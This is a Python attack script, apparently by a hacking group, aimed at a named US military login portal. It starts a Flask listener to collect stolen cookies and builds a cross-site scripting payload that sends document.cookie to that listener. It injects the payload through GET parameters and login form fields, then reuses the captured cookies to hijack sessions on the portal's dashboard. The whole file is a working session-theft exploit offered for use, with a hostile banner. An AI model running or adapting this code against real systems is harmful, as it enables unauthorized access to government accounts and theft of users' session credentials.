#!/usr/bin/env python3
import threading
import requests
import time
import logging
from flask import Flask, request, jsonify
from urllib.parse import urlparse, urlencode, urljoin

TARGET_URL = "https://auth.devilops.mil/auth/resources/9int0/login/darksaber-dod/"
AUTH_DASHBOARD_PATH = "/auth/resources/9int0/dashboard"
LISTENER_HOST = "0.0.0.0"
LISTENER_PORT = 8080
ATTACKER_SERVER_URL = None

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

captured_cookies = []

app = Flask(__name__)

@app.route("/log", methods=["GET", "POST"])
def log_cookies():
    cookie_data = request.args.get("c") if request.method == "GET" else request.form.get("c")
    if cookie_data:
        logging.info(f"[!] Captured Cookies: {cookie_data}")
        captured_cookies.append(cookie_data)
        return jsonify({"status": "success", "message": "Cookies logged"})
    return jsonify({"status": "error", "message": "No cookie data received"}), 400

def run_listener():
    logging.info(f"Starting listener server at http://{LISTENER_HOST}:{LISTENER_PORT}/log")
    app.run(host=LISTENER_HOST, port=LISTENER_PORT, debug=False, use_reloader=False)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (GhostSec-Darksaber-Exploit) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded"
}

def build_payload(attacker_server):
    return (
        "<script>"
        "var i=new Image();"
        f"i.src='{attacker_server}/log?c='+encodeURIComponent(document.cookie);"
        "setTimeout(function(){window.location='" + AUTH_DASHBOARD_PATH + "';},3000);"
        "</script>"
    )

def exploit_get_injection(target, payload):
    logging.info("[*] Exploiting via GET parameter injection with full session theft payload...")
    parsed = urlparse(target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = {"data-content": payload}
    attack_url = f"{base_url}?{urlencode(params)}"
    try:
        resp = requests.get(attack_url, headers=HEADERS, timeout=15, verify=False)
        if payload in resp.text:
            logging.info("[!!!] Payload injected and reflected successfully in GET request.")
            logging.info(f"[+] Attack URL: {attack_url}")
            return True
        else:
            logging.warning("[-] Payload not reflected in GET response.")
            return False
    except Exception as e:
        logging.error(f"[-] GET injection request failed: {e}")
        return False

def exploit_post_injection(target, payload):
    logging.info("[*] Exploiting via POST injection on login fields with session theft payload...")
    data = {"username": payload, "password": "irrelevant"}
    try:
        resp = requests.post(target, headers=HEADERS, data=data, timeout=15, verify=False)
        if payload in resp.text:
            logging.info("[!!!] Payload injected and reflected successfully in POST response.")
            return True
        else:
            logging.warning("[-] Payload not reflected in POST response.")
            return False
    except Exception as e:
        logging.error(f"[-] POST injection request failed: {e}")
        return False

def session_hijack(cookie_string):
    logging.info("[*] Attempting session hijack with stolen cookies...")
    session = requests.Session()
    cookie_pairs = cookie_string.split("; ")
    for pair in cookie_pairs:
        if '=' in pair:
            name, value = pair.split("=", 1)
            session.cookies.set(name, value)
    target_dashboard = urljoin(TARGET_URL, AUTH_DASHBOARD_PATH)
    try:
        resp = session.get(target_dashboard, timeout=15, verify=False)
        if resp.status_code == 200 and "logout" in resp.text.lower():
            logging.info("[+] Session hijack successful! Access to dashboard confirmed.")
            snippet = resp.text[:500].replace("\n", " ")
            logging.info(f"[Dashboard snippet]: {snippet}...")
            return True
        else:
            logging.warning("[-] Session hijack failed or dashboard inaccessible.")
            return False
    except Exception as e:
        logging.error(f"[-] Session hijack request failed: {e}")
        return False

def main():
    global ATTACKER_SERVER_URL
    print("Fisting The US Government")
    print("This tool exploits a persistent XSS vulnerability in Bootstrap v4.5.3 implementation on the target authentication portal to steal session cookies and gain full unauthorized access to the parent domain by bypassing login.")
    listener_thread = threading.Thread(target=run_listener, daemon=True)
    listener_thread.start()
    time.sleep(2)
    ATTACKER_SERVER_URL = f"http://localhost:{LISTENER_PORT}"
    logging.info(f"Using attacker server URL for payload: {ATTACKER_SERVER_URL}")
    payload = build_payload(ATTACKER_SERVER_URL)
    get_success = exploit_get_injection(TARGET_URL, payload)
    time.sleep(2)
    post_success = exploit_post_injection(TARGET_URL, payload)
    logging.info("[*] Waiting up to 60 seconds for stolen cookies to arrive...")
    waited = 0
    while waited < 60:
        if captured_cookies:
            logging.info("[*] Stolen cookies received!")
            for c in captured_cookies:
                logging.info(f"[Captured Cookie]: {c}")
                session_hijack(c)
            break
        time.sleep(3)
        waited += 3
    else:
        logging.warning("[-] No cookies captured within timeout window.")
    logging.info("[*] Exploit run complete.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()